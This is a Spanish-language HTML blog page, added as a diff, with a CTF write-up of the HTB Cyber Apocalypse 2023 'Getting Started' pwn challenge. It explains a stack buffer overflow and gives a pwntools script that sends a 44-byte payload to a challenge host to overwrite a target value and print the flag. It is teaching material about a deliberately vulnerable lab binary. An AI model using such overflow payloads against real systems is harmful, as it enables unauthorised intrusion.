@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup Getting Started Cyber Apocalypse 2023</title>
+
+  <meta name="description" content="Resolución del challenge Getting Started del Cyber Apocalypse 2023">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup Getting Started Cyber Apocalypse 2023">
+  <meta name="twitter:description" content="Resolución del challenge Getting Started del Cyber Apocalypse 2023">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup Getting Started Cyber Apocalypse 2023">
+  <meta property="og:description" content="Resolución del challenge Getting Started del Cyber Apocalypse 2023">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="canonical" href="http://localhost:4000/">
+  <link rel="alternate" type="application/rss+xml" title="Writeup Getting Started Cyber Apocalypse 2023" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/ca2023" title="GatoGamer1155" class="blog-button">Cyber Apocalypse</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+              
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="GatoGamer1155" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">Cyber Apocalypse 2023</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ca/pwn.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Getting Started</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Además de un host se nos proporciona un <code class="language-plaintext highlighter-rouge">zip</code> que al descomprimirlo nos deja varios archivos, entre ellos una <code class="language-plaintext highlighter-rouge">flag</code> falsa, un <code class="language-plaintext highlighter-rouge">script</code> en python y un <code class="language-plaintext highlighter-rouge">binario</code> compilado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ls
+</span><span class="az"> glibc  </span><span class="p"> flag.txt  </span><span class="ve"> gs   wrapper.py  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> de como esta estructurada la <code class="language-plaintext highlighter-rouge">pila</code> e instrucciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 188.166.152.84 32451
+</span><span class="az">
+Stack frame layout 
+
+|      .      | <- Higher addresses
+|      .      |
+|_____________|
+|             | <- 64 bytes
+| Return addr |
+|_____________|
+|             | <- 56 bytes
+|     RBP     |
+|_____________|
+|             | <- 48 bytes
+|   target    |
+|_____________|
+|             | <- 40 bytes
+|  alignment  |
+|_____________|
+|             | <- 32 bytes
+|  Buffer[31] |
+|_____________|
+|      .      |
+|      .      |
+|_____________|
+|             |
+|  Buffer[0]  |
+|_____________| <- Lower addresses
+
+
+      [Addr]       |      [Value]       
+-------------------+-------------------
+0x00007ffc3a53fe50 | </span><span class="ve">0x0000000000000000</span><span class="az"> <- </span><span class="ve">Start of buffer</span><span class="az">
+0x00007ffc3a53fe58 | 0x0000000000000000
+0x00007ffc3a53fe60 | 0x0000000000000000
+0x00007ffc3a53fe68 | 0x0000000000000000
+0x00007ffc3a53fe70 | 0x6969696969696969 <- Dummy value for alignment
+0x00007ffc3a53fe78 | </span><span class="ro">0x00000000deadbeef</span><span class="az"> <- </span><span class="ro">Target to change</span><span class="az">
+0x00007ffc3a53fe80 | 0x0000563333f7a800 <- Saved rbp
+0x00007ffc3a53fe88 | 0x00007fb950c21c87 <- Saved return address
+0x00007ffc3a53fe90 | 0x0000002000000000
+0x00007ffc3a53fe98 | 0x00007ffc3a53ff68
+
+
+After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:
+
+
+      [Addr]       |      [Value]       
+-------------------+-------------------
+0x00007ffc3a53fe50 | </span><span class="ve">0x0000000041414141</span><span class="az"> <- </span><span class="ve">Start of buffer</span><span class="az">
+0x00007ffc3a53fe58 | 0x0000000000000000
+0x00007ffc3a53fe60 | 0x0000000000000000
+0x00007ffc3a53fe68 | 0x0000000000000000
+0x00007ffc3a53fe70 | 0x6969696969696969 <- Dummy value for alignment
+0x00007ffc3a53fe78 | </span><span class="ro">0x00000000deadbeef</span><span class="az"> <- </span><span class="ro">Target to change</span><span class="az">
+0x00007ffc3a53fe80 | 0x0000563333f7a800 <- Saved rbp
+0x00007ffc3a53fe88 | 0x00007fb950c21c87 <- Saved return address
+0x00007ffc3a53fe90 | 0x0000002000000000
+0x00007ffc3a53fe98 | 0x00007ffc3a53ff68
+
+
+After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:
+
+
+      [Addr]       |      [Value]       
+-------------------+-------------------
+0x00007ffc3a53fe50 | </span><span class="ve">0x4242424241414141</span><span class="az"> <- </span><span class="ro">Start of buffer</span><span class="az">
+0x00007ffc3a53fe58 | 0x0000000000000000
+0x00007ffc3a53fe60 | 0x0000000000000000
+0x00007ffc3a53fe68 | 0x0000000000000000
+0x00007ffc3a53fe70 | 0x6969696969696969 <- Dummy value for alignment
+0x00007ffc3a53fe78 | </span><span class="ve">0x00000000deadbeef</span><span class="az"> <- </span><span class="ro">Target to change</span><span class="az">
+0x00007ffc3a53fe80 | 0x0000563333f7a800 <- Saved rbp
+0x00007ffc3a53fe88 | 0x00007fb950c21c87 <- Saved return address
+0x00007ffc3a53fe90 | 0x0000002000000000
+0x00007ffc3a53fe98 | 0x00007ffc3a53ff68
+
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉
+◉                                                                                                 ◉
+◉  Fill the 32-byte buffer, overwrite the alginment address and the "target's" 0xdeadbeef value.  ◉
+◉                                                                                                 ◉
+◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉  
+
+>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Analizemos poco a poco, al inicio se nos muestra como esta conformada la pila y que son necesarios <code class="language-plaintext highlighter-rouge">40</code> bytes para llegar al inicio del target, este finaliza a los <code class="language-plaintext highlighter-rouge">48</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">Stack frame layout 
+
+|      .      | <- Higher addresses  
+|      .      |
+|_____________|
+|             | <- 64 bytes
+| Return addr |
+|_____________|
+|             | <- 56 bytes
+|     RBP     |
+|_____________|
+|             | <- 48 bytes
+|   target    |
+|_____________|
+|             | <- 40 bytes
+|  alignment  |
+|_____________|
+|             | <- 32 bytes
+|  Buffer[31] |
+|_____________|
+|      .      |
+|      .      |
+|_____________|
+|             |
+|  Buffer[0]  |
+|_____________| <- Lower addresses</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Asi que con <code class="language-plaintext highlighter-rouge">48</code> bytes sobreescribimos el valor completo del <code class="language-plaintext highlighter-rouge">target</code> sin embargo nos piden que cambiemos la cadena <code class="language-plaintext highlighter-rouge">deadbeef</code> que tiene <code class="language-plaintext highlighter-rouge">4</code> bytes en lugar de <code class="language-plaintext highlighter-rouge">8</code> asi que solo necesitamos <code class="language-plaintext highlighter-rouge">44</code> de esta manera nos quedaria <code class="language-plaintext highlighter-rouge">0x00000000</code> y los <code class="language-plaintext highlighter-rouge">4</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">0x00007ffc3a53fe78 | </span><span class="ro">0x00000000deadbeef</span><span class="az"> <- </span><span class="ro">Target to change  </span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">python</code> podemos crear una cadena con la letra <code class="language-plaintext highlighter-rouge">A</code> que se repita <code class="language-plaintext highlighter-rouge">44</code> veces</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> -q
+>>> "A" * 44
+'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
+>>></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar la cadena de <code class="language-plaintext highlighter-rouge">44</code> bytes sobreescribimos <code class="language-plaintext highlighter-rouge">deadbeef</code> y nos muestra la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+      [Addr]       |      [Value]       
+-------------------+-------------------
+0x00007ffe3e564220 | </span><span class="ve">0x4141414141414141</span><span class="az"> <- </span><span class="ve">Start of buffer</span><span class="az">
+0x00007ffe3e564228 | 0x4141414141414141
+0x00007ffe3e564230 | 0x4141414141414141
+0x00007ffe3e564238 | 0x4141414141414141
+0x00007ffe3e564240 | 0x4141414141414141 <- Dummy value for alignment  
+0x00007ffe3e564248 | </span><span class="ro">0x0000000041414141</span><span class="az"> <- </span><span class="ro">Target to change</span><span class="az">
+0x00007ffe3e564250 | 0x000055b11e0a5800 <- Saved rbp
+0x00007ffe3e564258 | 0x00007efe8be21c87 <- Saved return address
+0x00007ffe3e564260 | 0x0000002000000000
+0x00007ffe3e564268 | 0x00007ffe3e564338
+
+HTB{b0f_s33m5_3z_r1ght?}
+
+</span><span class="ro">[-] You failed!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos automatizar esto en un <code class="language-plaintext highlighter-rouge">script</code> que cree una conexión con el argumento <code class="language-plaintext highlighter-rouge">host:port</code> que le pasemos, envie los <code class="language-plaintext highlighter-rouge">bytes</code> y reciba la linea de la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log, remote
+</span><span class="o">import </span><span class="p">sys
+
+</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
+    log.failure(</span><span class="no">f</span><span class="s">"Uso: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]} </span><span class="s">&lthost:port>"</span><span class="p">)
+    sys.exit(</span><span class="mi">1</span><span class="p">)
+
+host, port </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">].split(</span><span class="s">":"</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(host, port)
+
+payload </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="mi">44</span><span class="p">
+
+shell.sendline(payload)
+
+flag </span><span class="o">= </span><span class="p">shell.recvline_contains(</span><span class="no">b</span><span class="s">"HTB"</span><span class="p">).strip().decode()  
+
+log.success(</span><span class="no">f</span><span class="s">"Flag: </span><span class="p">{flag}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo con <code class="language-plaintext highlighter-rouge">host:port</code> como <code class="language-plaintext highlighter-rouge">argumento</code> envia el payload y recibimos la <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py 188.166.152.84:30284
+[</span><span class="ve">+</span><span class="p">] Opening connection to 188.166.152.84 on port 30284: Done  
+[</span><span class="ve">+</span><span class="p">] Flag: HTB{b0f_s33m5_3z_r1ght?}
+[</span><span class="az">*</span><span class="p">] Closed connection to 188.166.152.84 port 30284</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
